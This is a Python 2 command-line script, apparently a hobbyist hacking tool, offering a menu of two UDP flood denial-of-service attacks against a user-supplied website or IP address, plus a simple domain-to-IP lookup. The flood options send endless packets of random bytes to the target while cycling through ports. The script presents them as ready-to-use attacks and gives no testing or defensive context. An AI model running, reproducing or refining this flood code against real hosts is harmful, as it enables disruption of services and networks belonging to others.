import socket
import sys
import os
import time
import random

W = "\033[0m"
G = '\033[32;1m'
R = '\033[31;1m'
B = '\033[0;34m'
Y = "\033[0;33m" 
P = "\033[0;35m"
C = "\033[0;36m"

def main():

    os.system("clear")
    print R+"############################################################"
    print "#",P+"              [{ Info about creator }]",R+"                  #"
    print "#                                                          #"
    print "# Creator :-",B + "[<Muhamad_Ameen>]","From Iraq" ,R+"                  #"
    print "# Facebook :-",B+"https://www.facebook.com/muhamad.hamadameen/",R+"#"
    print "# Github :-",B+"https://github.com/Muhamad-Ameen",R+"              #"
    print "############################################################"
    print " "
    print " "
    print G+"#########################TOOL############################"
    print "#                      ",P+"[{CHOSE}]",G+"                      #"
    print "#                                                       #"
    print "# Dos_Attack on Web Site With site Adress And Port.",Y+"[1]",G+"#"
    print "# Dos_Attack With IP And Port                      ",Y+"[2]",G+"#"
    print "# Web_IP Getter                                    ",Y+"[3]",G+"#"
    print "#########################################################"
    

    gg = raw_input(Y+ "Chose Number :- ")   


    if (gg == '1') :
        os.system("clear")
        print "#########################NOTE########################"
        print "#                   Dos-Attack Tool                 #"
        print "# This Dos Script Just For Sites                    #"
        print "# In This Script You Just Need Name Of The WebSite  #"
        print "# And You Need Type The Port                        #"
        print "# If Your Site Was Http Then The Port Is 80         #"
        print "# But If Your Site Was Https Then The Port Is 443   #"
        print "#####################################################"
        os.system ("toilet -f big 'Dos Attack' -F gay")
        domin = raw_input("Enter The WebAdress Name :- ")
        ip = socket.gethostbyname(domin)
        print 'Host Name is:- ',domin, '\n' 'The Web IP is:- ',ip
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        port = input("Port       : ")
        sent = 0

        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
            if port == 65534:
                port = 1

    elif (gg == '2'):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        os.system("clear")
        print P+""
        os.system("figlet Dos Attack")
        os.system("toilet -f big 'LORD' -F gay")
        ip = raw_input("IP Target : ")
        port = input("Port       : ")
        sent = 0
        
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
            if port == 65534:
                port = 1


    elif (gg == '3') :
        os.system("clear")
        print C+"#########################NOTE########################"
        print "#                   Web Ip Getter                   #"
        print "#       This Tool Just For Getting Websits Ip       #"
        print "#####################################################",R
        os.system ("figlet Web IP Getter")
        hostname = raw_input ("Enter Your WebAdress :- ")
        ip = socket.gethostbyname(hostname)
        print "Host Name is :- ",hostname
        print "The Web IP is :- ",ip
        print Y+"Press Enter for Restart"
        restart = raw_input ("")
        if restart == "":
            main()


    else :
        print R+"Choose Number between 1-3"
        print R+"Press Enter for Restart"
        restart = raw_input ("")
        if restart == "":
            main()

main()
